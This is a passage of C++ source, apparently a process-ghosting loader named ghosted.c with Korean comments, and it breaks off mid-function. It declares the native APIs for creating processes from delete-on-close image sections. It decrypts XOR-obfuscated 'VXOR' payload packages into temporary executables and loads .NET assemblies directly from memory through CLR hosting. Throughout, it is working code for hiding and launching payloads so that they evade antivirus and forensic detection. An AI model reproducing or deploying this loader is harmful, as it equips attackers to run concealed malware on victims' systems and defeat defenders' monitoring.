#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>
#include <wctype.h>
#include <windows.h>
#include <winternl.h>
#include <metahost.h>

#if !defined(__cplusplus)
#error Compile this source as C++ (MSVC: cl /TP ghosted.c).
#endif

#import "mscorlib.tlb" \
    raw_interfaces_only \
    high_property_prefixes("_get", "_put", "_putref") \
    rename("ReportEvent", "InteropServices_ReportEvent")

#if defined(_MSC_VER)
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "mscoree.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#endif

// Windows SDK의 공개 RTL_USER_PROCESS_PARAMETERS는 내부 필드를 Reserved로
// 노출하므로, RtlCreateProcessParametersEx가 반환한 블록의 길이 prefix만 사용한다.
typedef struct _RTL_USER_PROCESS_PARAMETERS_PREFIX {
    ULONG MaximumLength;
    ULONG Length;
} RTL_USER_PROCESS_PARAMETERS_PREFIX, *PRTL_USER_PROCESS_PARAMETERS_PREFIX;

// Native API 함수 포인터 정의
typedef NTSTATUS(NTAPI* pfnNtCreateProcessEx)(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ParentProcess,
    ULONG Flags,
    HANDLE SectionHandle,
    HANDLE DebugPort,
    HANDLE TokenHandle,
    ULONG Reserved
);

typedef NTSTATUS(NTAPI* pfnNtCreateSection)(
    PHANDLE SectionHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection,
    ULONG AllocationAttributes,
    HANDLE FileHandle
);

typedef NTSTATUS(NTAPI* pfnNtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

typedef NTSTATUS(NTAPI* pfnNtQueryInformationProcess)(
    HANDLE ProcessHandle, 
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation, 
    ULONG ProcessInformationLength, 
    PULONG ReturnLength
);

typedef NTSTATUS(NTAPI* pfnRtlCreateProcessParametersEx)(
    PRTL_USER_PROCESS_PARAMETERS* pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef VOID(NTAPI* pfnRtlDestroyProcessParameters)(
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters
);

typedef BOOL(WINAPI* pfnIsWow64Process2)(
    HANDLE Process,
    PUSHORT ProcessMachine,
    PUSHORT NativeMachine
);

#ifndef SEC_IMAGE
#define SEC_IMAGE 0x1000000
#endif

#ifndef RTL_USER_PROCESS_PARAMETERS_NORMALIZED
#define RTL_USER_PROCESS_PARAMETERS_NORMALIZED 0x01
#endif

#ifndef COMIMAGE_FLAGS_ILONLY
#define COMIMAGE_FLAGS_ILONLY 0x00000001
#endif

#ifndef COMIMAGE_FLAGS_32BITREQUIRED
#define COMIMAGE_FLAGS_32BITREQUIRED 0x00000002
#endif

#define GHOST_PROCESS_ACCESS ( \
    PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | \
    PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_TERMINATE | SYNCHRONIZE)

#define GHOST_VXOR_SWITCH L"--vxor"
#define GHOST_MANAGED_MEMORY_SWITCH L"--managed-memory"
#define GHOST_SELF_CHILD_SWITCH L"--self-child"

#define VXOR_MAGIC "VXOR"
#define VXOR_VERSION 1
#define VXOR_HEADER_SIZE 40
#define VXOR_MAX_KEY_SIZE 64
#define VXOR_FNV_OFFSET 1469598103934665603ULL
#define VXOR_FNV_PRIME 1099511628211ULL

#if defined(GHOST_DIAGNOSTIC_KEEP_FILE)
#define GHOST_TEMP_FILE_FLAGS FILE_ATTRIBUTE_NORMAL
#else
#define GHOST_TEMP_FILE_FLAGS (FILE_ATTRIBUTE_NORMAL | FILE_FLAG_DELETE_ON_CLOSE)
#endif

static void PrintWin32Error(const char* operation) {
    fprintf(stderr, "[-] %s failed (Win32: %lu)\n", operation, GetLastError());
}

static void PrintNtError(const char* operation, NTSTATUS status) {
    fprintf(stderr, "[-] %s failed (NTSTATUS: 0x%08lX)\n",
        operation,
        (unsigned long)status);
}

static int IsNativeAmd64Host(void) {
    HMODULE kernel32 = GetModuleHandleW(L"kernel32.dll");
    pfnIsWow64Process2 queryArchitecture = kernel32
        ? (pfnIsWow64Process2)GetProcAddress(kernel32, "IsWow64Process2")
        : NULL;
    if (queryArchitecture) {
        USHORT processMachine = IMAGE_FILE_MACHINE_UNKNOWN;
        USHORT nativeMachine = IMAGE_FILE_MACHINE_UNKNOWN;
        if (queryArchitecture(
                GetCurrentProcess(),
                &processMachine,
                &nativeMachine)) {
            (void)processMachine;
            return nativeMachine == IMAGE_FILE_MACHINE_AMD64;
        }
    }

    SYSTEM_INFO nativeSystem;
    ZeroMemory(&nativeSystem, sizeof(nativeSystem));
    GetNativeSystemInfo(&nativeSystem);
    return nativeSystem.wProcessorArchitecture ==
        PROCESSOR_ARCHITECTURE_AMD64;
}

typedef struct _GHOST_COR20_HEADER_PREFIX {
    DWORD HeaderSize;
    WORD MajorRuntimeVersion;
    WORD MinorRuntimeVersion;
    IMAGE_DATA_DIRECTORY MetaData;
    DWORD Flags;
    DWORD EntryPointToken;
} GHOST_COR20_HEADER_PREFIX, *PGHOST_COR20_HEADER_PREFIX;

typedef enum _GHOST_IMAGE_KIND {
    GHOST_IMAGE_INVALID = 0,
    GHOST_IMAGE_NATIVE_COMPATIBLE = 1,
    GHOST_IMAGE_MANAGED = 2,
    GHOST_IMAGE_UNSUPPORTED = -1
} GHOST_IMAGE_KIND;

typedef struct _WIDE_BUFFER {
    wchar_t* Data;
    size_t Length;
    size_t Capacity;
} WIDE_BUFFER;

typedef struct _VXOR_HEADER {
    unsigned char Version;
    size_t KeyLength;
    uint64_t PlainSize;
    uint64_t PlainHash;
    uint64_t CipherSize;
    uint64_t CipherHash;
} VXOR_HEADER;

typedef struct _DECODED_BUFFER {
    unsigned char* Data;
    size_t Size;
} DECODED_BUFFER;

static GHOST_IMAGE_KIND ClassifyImageForCurrentBuild(
    PVOID fileData,
    DWORD fileSize);
static PBYTE RvaToFilePointer(
    PBYTE image,
    DWORD imageSize,
    DWORD rva,
    DWORD requiredSize,
    PIMAGE_FILE_HEADER fileHeader,
    PBYTE optionalHeader);

static void SecureZero(void* pointer, size_t length) {
    volatile unsigned char* cursor = (volatile unsigned char*)pointer;
    while (length-- > 0) {
        *cursor++ = 0;
    }
}

static void FreeDecodedBuffer(DECODED_BUFFER* decoded) {
    if (!decoded) {
        return;
    }
    if (decoded->Data) {
        SecureZero(decoded->Data, decoded->Size);
        free(decoded->Data);
    }
    decoded->Data = NULL;
    decoded->Size = 0;
}

static uint64_t UpdateFnv1a(
    uint64_t hash,
    const unsigned char* data,
    size_t length
) {
    for (size_t i = 0; i < length; ++i) {
        hash ^= data[i];
        hash *= VXOR_FNV_PRIME;
    }
    return hash;
}

static uint16_t ReadUint16LittleEndian(const unsigned char* data) {
    return (uint16_t)data[0] | ((uint16_t)data[1] << 8);
}

static uint64_t ReadUint64LittleEndian(const unsigned char* data) {
    uint64_t value = 0;
    for (int i = 0; i < 8; ++i) {
        value |= (uint64_t)data[i] << (i * 8);
    }
    return value;
}

static int WideHexValue(wchar_t character) {
    if (character >= L'0' && character <= L'9') {
        return (int)(character - L'0');
    }
    character = towlower(character);
    if (character >= L'a' && character <= L'f') {
        return (int)(character - L'a') + 10;
    }
    return -1;
}

static int ParseWideHexKey(
    const wchar_t* text,
    unsigned char* key,
    size_t* keyLength
) {
    wchar_t compact[VXOR_MAX_KEY_SIZE * 2 + 1];
    size_t compactLength = 0;

    if (text[0] == L'0' && (text[1] == L'x' || text[1] == L'X')) {
        text += 2;
    }

    for (; *text; ++text) {
        if (*text == L':' || *text == L'-' || *text == L'_' ||
            iswspace(*text)) {
            continue;
        }
        if (!iswxdigit(*text) || compactLength >= ARRAYSIZE(compact) - 1) {
            return 0;
        }
        compact[compactLength++] = *text;
    }

    if (!compactLength || compactLength % 2) {
        return 0;
    }

    *keyLength = compactLength / 2;
    for (size_t i = 0; i < *keyLength; ++i) {
        int high = WideHexValue(compact[i * 2]);
        int low = WideHexValue(compact[i * 2 + 1]);
        if (high < 0 || low < 0) {
            return 0;
        }
        key[i] = (unsigned char)((high << 4) | low);
    }
    return 1;
}

static int ParseVxorHeader(
    const unsigned char* rawHeader,
    VXOR_HEADER* header
) {
    if (memcmp(rawHeader, VXOR_MAGIC, 4) != 0) {
        fprintf(stderr, "[-] Invalid VXOR package: magic mismatch.\n");
        return 0;
    }

    header->Version = rawHeader[4];
    header->KeyLength = rawHeader[5];
    uint16_t flags = ReadUint16LittleEndian(rawHeader + 6);
    if (header->Version != VXOR_VERSION) {
        fprintf(stderr,
            "[-] Unsupported VXOR package version: %u.\n",
            header->Version);
        return 0;
    }
    if (!header->KeyLength ||
        header->KeyLength > VXOR_MAX_KEY_SIZE ||
        flags != 0) {
        fprintf(stderr, "[-] Invalid VXOR package header fields.\n");
        return 0;
    }

    header->PlainSize = ReadUint64LittleEndian(rawHeader + 8);
    header->PlainHash = ReadUint64LittleEndian(rawHeader + 16);
    header->CipherSize = ReadUint64LittleEndian(rawHeader + 24);
    header->CipherHash = ReadUint64LittleEndian(rawHeader + 32);
    return 1;
}

static int ReadExactFileBytes(
    HANDLE file,
    unsigned char* destination,
    size_t length
) {
    size_t offset = 0;
    while (offset < length) {
        DWORD chunkSize = length - offset > MAXDWORD
            ? MAXDWORD
            : (DWORD)(length - offset);
        DWORD bytesRead = 0;
        if (!ReadFile(
                file,
                destination + offset,
                chunkSize,
                &bytesRead,
                NULL) ||
            bytesRead != chunkSize) {
            return 0;
        }
        offset += bytesRead;
    }
    return 1;
}

static int DecodeVxorPackage(
    LPCWSTR packagePath,
    const unsigned char* key,
    size_t keyLength,
    DECODED_BUFFER* decoded
) {
    HANDLE package = INVALID_HANDLE_VALUE;
    unsigned char rawHeader[VXOR_HEADER_SIZE];
    VXOR_HEADER header = { 0 };
    unsigned char* buffer = NULL;
    int success = 0;

    decoded->Data = NULL;
    decoded->Size = 0;

    package = CreateFileW(
        packagePath,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL);
    if (package == INVALID_HANDLE_VALUE) {
        PrintWin32Error("CreateFileW(VXOR package)");
        return 0;
    }

    LARGE_INTEGER packageSize = { 0 };
    if (!GetFileSizeEx(package, &packageSize)) {
        PrintWin32Error("GetFileSizeEx(VXOR package)");
        goto cleanup;
    }
    if (packageSize.QuadPart < VXOR_HEADER_SIZE ||
        !ReadExactFileBytes(package, rawHeader, sizeof(rawHeader)) ||
        !ParseVxorHeader(rawHeader, &header)) {
        if (packageSize.QuadPart >= VXOR_HEADER_SIZE &&
            GetLastError() != ERROR_SUCCESS) {
            PrintWin32Error("ReadFile(VXOR header)");
        }
        goto cleanup;
    }

    if (header.KeyLength != keyLength) {
        fprintf(stderr,
            "[-] VXOR key length mismatch (package: %zu, provided: %zu).\n",
            header.KeyLength,
            keyLength);
        goto cleanup;
    }
    if (header.PlainSize != header.CipherSize ||
        header.PlainSize > SIZE_MAX ||
        header.CipherSize > INT64_MAX - VXOR_HEADER_SIZE ||
        packageSize.QuadPart !=
            (LONGLONG)(VXOR_HEADER_SIZE + header.CipherSize)) {
        fprintf(stderr, "[-] Invalid VXOR package payload size.\n");
        goto cleanup;
    }

    decoded->Size = (size_t)header.PlainSize;
    if (decoded->Size) {
        buffer = (unsigned char*)malloc(decoded->Size);
        if (!buffer) {
            fprintf(stderr,
                "[-] VXOR payload allocation failed (%zu bytes).\n",
                decoded->Size);
            goto cleanup;
        }
        if (!ReadExactFileBytes(package, buffer, decoded->Size)) {
            PrintWin32Error("ReadFile(VXOR payload)");
            goto cleanup;
        }
    }

    uint64_t cipherHash = UpdateFnv1a(
        VXOR_FNV_OFFSET,
        buffer,
        decoded->Size);
    if (cipherHash != header.CipherHash) {
        fprintf(stderr, "[-] VXOR cipher hash verification failed.\n");
        goto cleanup;
    }

    for (size_t i = 0; i < decoded->Size; ++i) {
        buffer[i] ^= key[i % keyLength];
    }

    uint64_t plainHash = UpdateFnv1a(
        VXOR_FNV_OFFSET,
        buffer,
        decoded->Size);
    if (plainHash != header.PlainHash) {
        fprintf(stderr,
            "[-] VXOR plain hash verification failed; key or package is invalid.\n");
        goto cleanup;
    }

    decoded->Data = buffer;
    buffer = NULL;
    success = 1;
    fwprintf(stdout,
        L"[+] Decoded and verified VXOR package: %ls\n",
        packagePath);
    printf("[+] Plain payload size: %zu bytes\n", decoded->Size);
    printf("[+] Plain FNV-1a64: 0x%016llX\n",
        (unsigned long long)plainHash);

cleanup:
    if (buffer) {
        SecureZero(buffer, decoded->Size);
        free(buffer);
    }
    if (package != INVALID_HANDLE_VALUE) {
        CloseHandle(package);
    }
    if (!success) {
        decoded->Size = 0;
    }
    return success;
}

static int WriteDecodedTemporaryPe(
    const DECODED_BUFFER* decoded,
    LPWSTR temporaryPath,
    DWORD temporaryPathLength
) {
    WCHAR temporaryDirectory[MAX_PATH];
    DWORD directoryLength = GetTempPathW(
        ARRAYSIZE(temporaryDirectory),
        temporaryDirectory);
    if (!directoryLength || directoryLength >= ARRAYSIZE(temporaryDirectory)) {
        PrintWin32Error("GetTempPathW(VXOR payload)");
        return 0;
    }
    if (!GetTempFileNameW(
            temporaryDirectory,
            L"VXR",
            0,
            temporaryPath)) {
        PrintWin32Error("GetTempFileNameW(VXOR payload)");
        return 0;
    }

    HANDLE output = CreateFileW(
        temporaryPath,
        GENERIC_WRITE,
        FILE_SHARE_READ,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_TEMPORARY,
        NULL);
    if (output == INVALID_HANDLE_VALUE) {
        PrintWin32Error("CreateFileW(decoded VXOR payload)");
        DeleteFileW(temporaryPath);
        temporaryPath[0] = L'\0';
        return 0;
    }

    size_t offset = 0;
    int success = 1;
    while (offset < decoded->Size) {
        DWORD chunkSize = decoded->Size - offset > MAXDWORD
            ? MAXDWORD
            : (DWORD)(decoded->Size - offset);
        DWORD bytesWritten = 0;
        if (!WriteFile(
                output,
                decoded->Data + offset,
                chunkSize,
                &bytesWritten,
                NULL) ||
            bytesWritten != chunkSize) {
            PrintWin32Error("WriteFile(decoded VXOR payload)");
            success = 0;
            break;
        }
        offset += bytesWritten;
    }

    if (success && !FlushFileBuffers(output)) {
        PrintWin32Error("FlushFileBuffers(decoded VXOR payload)");
        success = 0;
    }
    CloseHandle(output);

    if (!success) {
        DeleteFileW(temporaryPath);
        temporaryPath[0] = L'\0';
    }
    (void)temporaryPathLength;
    return success;
}

static int EnsureWideCapacity(WIDE_BUFFER* buffer, size_t additionalCharacters) {
    if (additionalCharacters > (SIZE_MAX - buffer->Length - 1)) {
        return 0;
    }

    size_t required = buffer->Length + additionalCharacters + 1;
    if (required <= buffer->Capacity) {
        return 1;
    }

    size_t newCapacity = buffer->Capacity ? buffer->Capacity : 256;
    while (newCapacity < required) {
        if (newCapacity > SIZE_MAX / 2) {
            newCapacity = required;
            break;
        }
        newCapacity *= 2;
    }

    wchar_t* resized = (wchar_t*)realloc(
        buffer->Data,
        newCapacity * sizeof(*resized));
    if (!resized) {
        return 0;
    }

    buffer->Data = resized;
    buffer->Capacity = newCapacity;
    return 1;
}

static int AppendWideCharacter(WIDE_BUFFER* buffer, wchar_t character) {
    if (!EnsureWideCapacity(buffer, 1)) {
        return 0;
    }
    buffer->Data[buffer->Length++] = character;
    buffer->Data[buffer->Length] = L'\0';
    return 1;
}

static int AppendRepeatedWideCharacter(
    WIDE_BUFFER* buffer,
    wchar_t character,
    size_t count
) {
    if (!EnsureWideCapacity(buffer, count)) {
        return 0;
    }
    for (size_t i = 0; i < count; ++i) {
        buffer->Data[buffer->Length++] = character;
    }
    buffer->Data[buffer->Length] = L'\0';
    return 1;
}

// Quote one argv element according to the CommandLineToArgvW parsing rules.
static int AppendCommandLineArgument(
    WIDE_BUFFER* buffer,
    const wchar_t* argument
) {
    int needsQuotes = argument[0] == L'\0' ||
        wcspbrk(argument, L" \t\n\v\"") != NULL;

    if (!needsQuotes) {
        size_t length = wcslen(argument);
        if (!EnsureWideCapacity(buffer, length)) {
            return 0;
        }
        memcpy(
            buffer->Data + buffer->Length,
            argument,
            length * sizeof(*argument));
        buffer->Length += length;
        buffer->Data[buffer->Length] = L'\0';
        return 1;
    }

    if (!AppendWideCharacter(buffer, L'"')) {
        return 0;
    }

    size_t backslashCount = 0;
    for (const wchar_t* cursor = argument; ; ++cursor) {
        if (*cursor == L'\\') {
            ++backslashCount;
            continue;
        }

        if (*cursor == L'"') {
            if (!AppendRepeatedWideCharacter(
                    buffer,
                    L'\\',
                    backslashCount * 2 + 1) ||
                !AppendWideCharacter(buffer, L'"')) {
                return 0;
            }
            backslashCount = 0;
            continue;
        }

        if (*cursor == L'\0') {
            if (!AppendRepeatedWideCharacter(
                    buffer,
                    L'\\',
                    backslashCount * 2) ||
                !AppendWideCharacter(buffer, L'"')) {
                return 0;
            }
            return 1;
        }

        if (!AppendRepeatedWideCharacter(buffer, L'\\', backslashCount) ||
            !AppendWideCharacter(buffer, *cursor)) {
            return 0;
        }
        backslashCount = 0;
    }
}

static int AppendCommandLineArguments(
    WIDE_BUFFER* commandLine,
    int argc,
    wchar_t* argv[],
    int startIndex
) {
    for (int i = startIndex; i < argc; ++i) {
        if (commandLine->Length &&
            !AppendWideCharacter(commandLine, L' ')) {
            return 0;
        }
        if (!AppendCommandLineArgument(commandLine, argv[i])) {
            return 0;
        }
    }
    return 1;
}

static SIZE_T GetWideEnvironmentBlockSize(LPCWCH environment) {
    if (!environment) {
        return 0;
    }

    LPCWCH cursor = environment;
    while (*cursor) {
        cursor += wcslen(cursor) + 1;
    }
    return ((SIZE_T)(cursor - environment) + 1) * sizeof(*environment);
}

static PVOID GetProcessParametersEnvironment(
    PRTL_USER_PROCESS_PARAMETERS processParameters
) {
#if defined(_WIN64)
    const SIZE_T environmentOffset = 0x80;
#else
    const SIZE_T environmentOffset = 0x48;
#endif
    return *(PVOID*)((PBYTE)processParameters + environmentOffset);
}

static LPWSTR GetContainingDirectory(LPCWSTR fullPath) {
    size_t length = wcslen(fullPath);
    LPWSTR directory = (LPWSTR)malloc(
        (length + 1) * sizeof(*directory));
    if (!directory) {
        return NULL;
    }
    memcpy(directory, fullPath, (length + 1) * sizeof(*directory));

    LPWSTR slash = wcsrchr(directory, L'\\');
    if (!slash) {
        free(directory);
        return NULL;
    }
    if (slash == directory + 2 && directory[1] == L':') {
        slash[1] = L'\0';
    } else {
        *slash = L'\0';
    }
    return directory;
}

static LPWSTR GetAbsolutePath(LPCWSTR path) {
    DWORD required = GetFullPathNameW(path, 0, NULL, NULL);
    if (!required) {
        return NULL;
    }

    LPWSTR fullPath = (LPWSTR)malloc(
        (SIZE_T)required * sizeof(*fullPath));
    if (!fullPath) {
        SetLastError(ERROR_NOT_ENOUGH_MEMORY);
        return NULL;
    }

    DWORD copied = GetFullPathNameW(path, required, fullPath, NULL);
    if (!copied || copied >= required) {
        free(fullPath);
        return NULL;
    }
    return fullPath;
}

static void PrintHResult(const char* operation, HRESULT result) {
    fprintf(stderr,
        "[-] %s failed (HRESULT: 0x%08lX)\n",
        operation,
        (unsigned long)result);
}

static int ReadFileIntoBuffer(
    LPCWSTR path,
    DECODED_BUFFER* buffer
) {
    HANDLE file = INVALID_HANDLE_VALUE;
    LARGE_INTEGER fileSize = { 0 };
    unsigned char* data = NULL;
    int success = 0;

    buffer->Data = NULL;
    buffer->Size = 0;
    file = CreateFileW(
        path,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL);
    if (file == INVALID_HANDLE_VALUE) {
        PrintWin32Error("CreateFileW(managed bytes)");
        return 0;
    }
    if (!GetFileSizeEx(file, &fileSize)) {
        PrintWin32Error("GetFileSizeEx(managed bytes)");
        goto cleanup;
    }
    if (fileSize.QuadPart <= 0 || fileSize.QuadPart > MAXDWORD) {
        fprintf(stderr, "[-] Managed image size is unsupported.\n");
        goto cleanup;
    }

    buffer->Size = (size_t)fileSize.QuadPart;
    data = (unsigned char*)malloc(buffer->Size);
    if (!data) {
        fprintf(stderr, "[-] Managed image allocation failed.\n");
        goto cleanup;
    }
    if (!ReadExactFileBytes(file, data, buffer->Size)) {
        PrintWin32Error("ReadFile(managed bytes)");
        goto cleanup;
    }

    buffer->Data = data;
    data = NULL;
    success = 1;

cleanup:
    if (data) {
        SecureZero(data, buffer->Size);
        free(data);
    }
    if (file != INVALID_HANDLE_VALUE) {
        CloseHandle(file);
    }
    if (!success) {
        buffer->Size = 0;
    }
    return success;
}

static SAFEARRAY* CreateManagedStringArray(
    int argumentCount,
    wchar_t* arguments[]
) {
    SAFEARRAY* result = SafeArrayCreateVector(
        VT_BSTR,
        0,
        (ULONG)argumentCount);
    if (!result) {
        return NULL;
    }

    for (LONG index = 0; index < argumentCount; ++index) {
        BSTR argument = SysAllocString(arguments[index]);
        if (!argument) {
            SafeArrayDestroy(result);
            return NULL;
        }
        HRESULT status = SafeArrayPutElement(result, &index, argument);
        SysFreeString(argument);
        if (FAILED(status)) {
            SafeArrayDestroy(result);
            return NULL;
        }
    }
    return result;
}

static int RunManagedAssemblyBytesInCurrentProcess(
    const unsigned char* assemblyBytes,
    size_t assemblySize,
    int argumentCount,
    wchar_t* arguments[],
    LPCWSTR workingDirectory
) {
    if (!assemblyBytes || !assemblySize || assemblySize > MAXDWORD) {
        fprintf(stderr, "[-] Invalid in-memory managed assembly.\n");
        return 1;
    }
    if (workingDirectory && !SetCurrentDirectoryW(workingDirectory)) {
        PrintWin32Error("SetCurrentDirectoryW(memory CLR)");
        return 1;
    }

    LPCWSTR runtimeVersion = L"v4.0.30319";

    HRESULT status = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    int shouldUninitializeCom = SUCCEEDED(status);
    if (FAILED(status) && status != RPC_E_CHANGED_MODE) {
        PrintHResult("CoInitializeEx(memory CLR)", status);
        return 1;
    }

    ICLRMetaHost* metaHost = NULL;
    ICLRRuntimeInfo* runtimeInfo = NULL;
    ICorRuntimeHost* runtimeHost = NULL;
    IUnknown* defaultDomainUnknown = NULL;
    mscorlib::_AppDomain* defaultDomain = NULL;
    mscorlib::_Assembly* assembly = NULL;
    mscorlib::_MethodInfo* entryPoint = NULL;
    SAFEARRAY* rawAssembly = NULL;
    SAFEARRAY* entryParameterMetadata = NULL;
    SAFEARRAY* managedArguments = NULL;
    SAFEARRAY* invokeArguments = NULL;
    int rawAssemblyLocked = 0;
    VARIANT invokeResult;
    VariantInit(&invokeResult);
    int returnCode = 1;

    status = CLRCreateInstance(
        CLSID_CLRMetaHost,
        IID_ICLRMetaHost,
        (LPVOID*)&metaHost);
    if (FAILED(status)) {
        PrintHResult("CLRCreateInstance(memory CLR)", status);
        goto cleanup;
    }

    status = metaHost->GetRuntime(
        runtimeVersion,
        IID_ICLRRuntimeInfo,
        (LPVOID*)&runtimeInfo);
    if (FAILED(status)) {
        PrintHResult("ICLRMetaHost::GetRuntime(v4.0.30319)", status);
        goto cleanup;
    }

    BOOL loadable = FALSE;
    status = runtimeInfo->IsLoadable(&loadable);
    if (FAILED(status) || !loadable) {
        if (FAILED(status)) {
            PrintHResult("ICLRRuntimeInfo::IsLoadable(memory CLR)", status);
        } else {
            fwprintf(stderr, L"[-] CLR %ls is not loadable.\n", runtimeVersion);
        }
        goto cleanup;
    }

    status = runtimeInfo->GetInterface(
        CLSID_CorRuntimeHost,
        IID_ICorRuntimeHost,
        (LPVOID*)&runtimeHost);
    if (FAILED(status)) {
        PrintHResult("ICLRRuntimeInfo::GetInterface(memory CLR)", status);
        goto cleanup;
    }
    status = runtimeHost->Start();
    if (FAILED(status)) {
        PrintHResult("ICorRuntimeHost::Start(memory CLR)", status);
        goto cleanup;
    }
    status = runtimeHost->GetDefaultDomain(&defaultDomainUnknown);
    if (FAILED(status)) {
        PrintHResult("ICorRuntimeHost::GetDefaultDomain(memory CLR)", status);
        goto cleanup;
    }
    status = defaultDomainUnknown->QueryInterface(
        __uuidof(mscorlib::_AppDomain),
        (PVOID*)&defaultDomain);
    if (FAILED(status)) {
        PrintHResult("IUnknown::QueryInterface(_AppDomain)", status);
        goto cleanup;
    }

    rawAssembly = SafeArrayCreateVector(
        VT_UI1,
        0,
        (ULONG)assemblySize);
    if (!rawAssembly) {
        PrintHResult("SafeArrayCreateVector(raw assembly)", E_OUTOFMEMORY);
        goto cleanup;
    }
    void* rawAssemblyData = NULL;
    status = SafeArrayAccessData(rawAssembly, &rawAssemblyData);
    if (FAILED(status)) {
        PrintHResult("SafeArrayAccessData(raw assembly)", status);
        goto cleanup;
    }
    rawAssemblyLocked = 1;
    memcpy(rawAssemblyData, assemblyBytes, assemblySize);
    status = SafeArrayUnaccessData(rawAssembly);
    if (FAILED(status)) {
        PrintHResult("SafeArrayUnaccessData(raw assembly)", status);
        goto cleanup;
    }
    rawAssemblyLocked = 0;

    wprintf(
        L"[i] Loading %zu managed bytes with CLR %ls in current process PID %lu.\n",
        assemblySize,
        runtimeVersion,
        GetCurrentProcessId());
    status = defaultDomain->Load_3(rawAssembly, &assembly);
    if (FAILED(status) || !assembly) {
        PrintHResult("_AppDomain::Load_3", status);
        goto cleanup;
    }
    status = assembly->get_EntryPoint(&entryPoint);
    if (FAILED(status) || !entryPoint) {
        PrintHResult("_Assembly::get_EntryPoint", status);
        goto cleanup;
    }

    status = entryPoint->GetParameters(&entryParameterMetadata);
    if (FAILED(status) || !entryParameterMetadata) {
        PrintHResult("_MethodInfo::GetParameters", status);
        goto cleanup;
    }
    LONG parameterLowerBound = 0;
    LONG parameterUpperBound = -1;
    status = SafeArrayGetLBound(
        entryParameterMetadata,
        1,
        &parameterLowerBound);
    if (SUCCEEDED(status)) {
        status = SafeArrayGetUBound(
            entryParameterMetadata,
            1,
            &parameterUpperBound);
    }
    if (FAILED(status)) {
        PrintHResult("SafeArray bounds(entry parameters)", status);
        goto cleanup;
    }
    LONG parameterCount = parameterUpperBound >= parameterLowerBound
        ? parameterUpperBound - parameterLowerBound + 1
        : 0;
    if (parameterCount > 1) {
        fprintf(stderr, "[-] Managed entry point has an unsupported signature.\n");
        goto cleanup;
    }

    if (parameterCount == 1) {
        managedArguments = CreateManagedStringArray(
            argumentCount,
            arguments);
        if (!managedArguments) {
            PrintHResult("CreateManagedStringArray", E_OUTOFMEMORY);
            goto cleanup;
        }
        invokeArguments = SafeArrayCreateVector(VT_VARIANT, 0, 1);
        if (!invokeArguments) {
            PrintHResult("SafeArrayCreateVector(invoke arguments)", E_OUTOFMEMORY);
            goto cleanup;
        }
        VARIANT argumentArray;
        VariantInit(&argumentArray);
        V_VT(&argumentArray) = VT_ARRAY | VT_BSTR;
        V_ARRAY(&argumentArray) = managedArguments;
        LONG zero = 0;
        status = SafeArrayPutElement(
            invokeArguments,
            &zero,
            &argumentArray);
        if (FAILED(status)) {
            PrintHResult("SafeArrayPutElement(invoke arguments)", status);
            goto cleanup;
        }
    }

    VARIANT staticTarget;
    VariantInit(&staticTarget);
    status = entryPoint->Invoke_3(
        staticTarget,
        invokeArguments,
        &invokeResult);
    if (FAILED(status)) {
        PrintHResult("_MethodInfo::Invoke_3", status);
        goto cleanup;
    }

    if (V_VT(&invokeResult) == VT_EMPTY || V_VT(&invokeResult) == VT_NULL) {
        returnCode = 0;
    } else if (V_VT(&invokeResult) == VT_I4 ||
               V_VT(&invokeResult) == VT_INT) {
        returnCode = V_I4(&invokeResult);
    } else {
        VARIANT convertedResult;
        VariantInit(&convertedResult);
        status = VariantChangeType(
            &convertedResult,
            &invokeResult,
            0,
            VT_I4);
        if (FAILED(status)) {
            PrintHResult("VariantChangeType(entry result)", status);
            VariantClear(&convertedResult);
            goto cleanup;
        }
        returnCode = V_I4(&convertedResult);
        VariantClear(&convertedResult);
    }
    printf("[+] In-memory managed assembly exit code: %d\n", returnCode);

cleanup:
    VariantClear(&invokeResult);
    if (invokeArguments) SafeArrayDestroy(invokeArguments);
    if (managedArguments) SafeArrayDestroy(managedArguments);
    if (entryParameterMetadata) SafeArrayDestroy(entryParameterMetadata);
    if (rawAssemblyLocked && rawAssembly) SafeArrayUnaccessData(rawAssembly);
    if (rawAssembly) SafeArrayDestroy(rawAssembly);
    if (entryPoint) entryPoint->Release();
    if (assembly) assembly->Release();
    if (defaultDomain) defaultDomain->Release();
    if (defaultDomainUnknown) defaultDomainUnknown->Release();
    if (runtimeHost) runtimeHost->Release();
    if (runtimeInfo) runtimeInfo->Release();
    if (metaHost) metaHost->Release();
    if (shouldUninitializeCom) CoUninitialize();
    return returnCode;
}

static int RunManagedFileFromMemory(
    int argc,
    wchar_t* argv[]
) {
    if (argc < 1) {
        fprintf(stderr, "[-] Managed memory mode requires a target path.\n");
        return 1;
    }

    LPWSTR fullPath = GetAbsolutePath(argv[0]);
    DECODED_BUFFER assembly = { 0 };
